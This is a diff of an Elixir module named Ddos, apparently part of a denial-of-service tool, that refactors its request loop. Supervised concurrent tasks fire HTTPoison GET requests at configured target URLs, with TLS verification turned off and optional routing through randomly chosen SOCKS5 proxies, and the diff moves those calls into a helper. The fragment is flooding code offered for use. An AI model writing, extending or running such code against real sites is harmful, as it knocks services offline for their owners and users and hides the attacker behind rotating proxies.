@@ -2,6 +2,7 @@ defmodule Ddos.GenServesr.Ddos do
     alias Ddos.Agents.DdosCounter
     alias Ddos.Agents.DdosConfig
     alias Ddos.Cache.RequestsCache
+    alias Ddos.Helpers.Query
     use GenServer
 
     @impl true
@@ -23,7 +24,7 @@ defmodule Ddos.GenServesr.Ddos do
     end
 
     defp start(threads \\ DdosConfig.get_threads()) do
-        uries = DdosConfig.get_uries()
+        urls = DdosConfig.get_urls()
         use_proxy = DdosConfig.get_use_proxy()
         {host, port} = DdosConfig.get_random_proxy()
 
@@ -31,13 +32,8 @@ defmodule Ddos.GenServesr.Ddos do
             Task.Supervisor.start_child(
                 Ddos.TaskSupervisor, 
                 fn -> 
-                    Enum.each(uries, fn uri -> 
-                        response = 
-                            if use_proxy === false do
-                                HTTPoison.get(uri, [], [ssl: [verify: :verify_none], hackney: [pool: :ddos], timeout: 5_000, recv_timeout: 5_000])
-                            else
-                                HTTPoison.get(uri, [], [ssl: [verify: :verify_none], hackney: [pool: :ddos], proxy: {:socks5, host, port}, timeout: 5_000, recv_timeout: 5_000])
-                            end
+                    Enum.each(urls, fn url -> 
+                        response = Query.request(url, use_proxy, host, port)
 
                         case response do
                             {:ok, body} -> 
